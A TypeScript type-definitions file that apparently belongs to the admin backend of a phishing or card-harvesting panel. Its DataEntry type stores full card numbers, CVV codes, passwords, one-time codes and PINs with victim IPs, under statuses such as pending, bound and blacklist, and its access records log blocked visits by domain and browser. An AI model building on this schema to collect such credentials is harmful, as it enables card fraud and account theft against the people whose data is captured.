export interface User {
  id: string
  name: string
  email: string
  avatar?: string
  role: 'admin' | 'user' | 'merchant'
  status: 'active' | 'inactive' | 'pending'
  createdAt: string
  lastLogin?: string
}

export interface Transaction {
  id: string
  merchantId: string
  merchantName: string
  amount: string
  currency: string
  channel: string
  status: 'success' | 'failed' | 'pending'
  fee: string
  orderId: string
  transactionId?: string
  createdAt: string
  updatedAt: string
}

export interface PaymentMethod {
  id: string
  name: string
  type: string
  status: 'active' | 'inactive' | 'maintenance'
  merchantId: string
  appId: string
  successRate: number
  todayTransactions: number
  todayVolume: string
  config: Record<string, any>
}

export interface AccessRecord {
  id: string
  domain: string
  browser: string
  platform: string
  browserInfo: string
  type: "success" | "blocked" | "warning"
  statusText: string
  ip: string
  country: string
  createdAt: string
}

export interface DataEntry {
  id: string
  userIdPrefix: string
  userIdSuffix: string
  userEmail: string
  account?: string
  password?: string
  otp?: string
  pin?: string
  name: string
  avatarFallback: string
  cardHolderName: string
  cardNumber: string
  cardExpiry: string
  cardCvv: string
  cardType: string
  remarks?: string
  status: "待处理" | "已绑定" | "已完成" | "垃圾桶" | "黑名单"
  ip: string
  createdAt: string
}

export interface LogEntry {
  id: string
  api: string
  parameters: string
  type: "log_info" | "order_stats" | "data_center" | "other"
  backendAccount: string
  ip: string
  userAgent: string
  createdAt: string
}

export interface SystemMetrics {
  cpu: number
  memory: number
  disk: number
  network: number
  uptime: string
  load: number[]
}

export interface ApiResponse<T = any> {
  success: boolean
  data?: T
  message?: string
  error?: string
}